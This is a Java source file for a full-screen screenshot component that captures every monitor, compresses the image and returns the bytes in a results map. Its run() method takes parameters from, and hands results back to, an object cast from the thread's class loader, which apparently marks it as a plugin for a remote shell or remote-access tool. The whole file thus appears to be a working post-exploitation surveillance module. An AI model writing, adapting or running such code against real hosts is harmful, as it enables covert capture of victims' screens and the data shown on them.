package org.leo.core.component;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.HashMap;
import java.util.Iterator;

/**
 * 屏幕截图组件
 * 提供全屏截图功能，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.1
 */
public class ScreenComponent implements Runnable {
    // 支持的图片格式
    private static final String[] SUPPORTED_FORMATS = {"jpg", "jpeg", "png", "bmp"};
    
    public HashMap<String, Object> params;
    public HashMap<String, Object> results;

    /**
     * 组件执行入口
     */
    @Override

    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    /**
     * 主要执行方法
     */
    public void invoke() throws Exception {
        // 检查是否支持图形环境
        if (!isGraphicsEnvironmentSupported()) {
            results.put("code", 501);
            results.put("msg", "当前环境不支持图形界面，无法进行屏幕截图");
            results.put("errorType", "HEADLESS_ENVIRONMENT");
            results.put("timestamp", System.currentTimeMillis());
            return;
        }
        
        // 获取参数
        String format = (String) params.get("format");
        if (format == null) format = "jpg";
        
        Object qualityObj = params.get("quality");
        float quality = qualityObj instanceof Number ? ((Number) qualityObj).intValue() / 100.0f : 0.8f;

        Object delayObj = params.get("delay");
        int delay = delayObj instanceof Number ? ((Number) delayObj).intValue() : 100;
        
        // 截图延迟，避免动画干扰
        if (delay > 0) {
            Thread.sleep(delay);
        }
        
        // 执行全屏截图
        BufferedImage screenImage = captureFullScreen();
        
        // 压缩和编码图片
        byte[] imageBytes = compressImage(screenImage, format, quality);
        
        // 设置结果
        results.put("screenBytes", imageBytes);
        results.put("imageSize", imageBytes.length);
        results.put("format", format);
        results.put("width", screenImage.getWidth());
        results.put("height", screenImage.getHeight());
        results.put("captureTime", System.currentTimeMillis());
        results.put("code",200);
    }

    /**
     * 检查是否支持图形环境
     */
    private boolean isGraphicsEnvironmentSupported() {
        try {
            // 检查是否有图形环境
            if (GraphicsEnvironment.isHeadless()) {
                return false;
            }
            
            // 尝试创建Robot对象来验证是否真的支持屏幕截图
            try {
                new Robot();
                return true;
            } catch (AWTException e) {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 兼容 Windows / macOS / Linux 多屏幕的全屏截图
     */
    private BufferedImage captureFullScreen() throws Exception {

        // Linux 环境补充检查（DISPLAY 缺失意味着无法截图）
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("linux")) {
            String display = System.getenv("DISPLAY");
            if (display == null || display.trim().isEmpty()) {
                throw new Exception("Linux 环境未检测到 DISPLAY，无法截屏（请确认运行于有图形界面的环境）");
            }
        }

        // macOS 权限提示（Robot 如果被系统阻止会抛异常）
        if (os.contains("mac")) {
            try {
                // mac 要求有屏幕录制权限
                new Robot();
            } catch (AWTException e) {
                throw new Exception("macOS 截屏失败：需要在“系统设置 → 隐私与安全 → 屏幕录制”授予权限");
            }
        }

        // 真正执行截图（多屏支持）
        GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        GraphicsDevice[] screens = ge.getScreenDevices();

        Rectangle allScreenBounds = new Rectangle();
        for (GraphicsDevice screen : screens) {
            Rectangle bounds = screen.getDefaultConfiguration().getBounds();
            allScreenBounds = allScreenBounds.union(bounds);
        }

        // 执行截图
        Robot robot = new Robot();
        robot.setAutoDelay(5);  // 增强兼容性（避免部分系统截图抖动）
        return robot.createScreenCapture(allScreenBounds);
    }


    /**
     * 压缩和编码图片
     */
    private byte[] compressImage(BufferedImage image, String format, float quality) throws Exception {
        // 验证格式
        if (!isFormatSupported(format)) {
            format = "jpg";
        }
        
        // 获取图片写入器
        Iterator<ImageWriter> writers = ImageIO.getImageWritersByFormatName(format);
        if (!writers.hasNext()) {
            throw new Exception("不支持的图片格式: " + format);
        }
        
        ImageWriter writer = writers.next();
        ImageWriteParam writeParam = writer.getDefaultWriteParam();
        
        // 设置压缩参数
        if (writeParam.canWriteCompressed()) {
            writeParam.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
            writeParam.setCompressionQuality(quality);
        }
        
        // 写入图片
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageOutputStream ios = null;
        try {
            ios = ImageIO.createImageOutputStream(baos);
            writer.setOutput(ios);
            writer.write(null, new IIOImage(image, null, null), writeParam);
        } finally {
            closeResource(ios);
            writer.dispose();
        }
        
        return baos.toByteArray();
    }

    /**
     * 检查格式是否支持
     */
    private boolean isFormatSupported(String format) {
        for (String supportedFormat : SUPPORTED_FORMATS) {
            if (supportedFormat.equalsIgnoreCase(format)) {
                return true;
            }
        }
        return false;
    }

    /**
     * 安全关闭资源
     */
    private void closeResource(java.io.Closeable resource) {
        if (resource != null) {
            try {
                resource.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
        }
    }
}
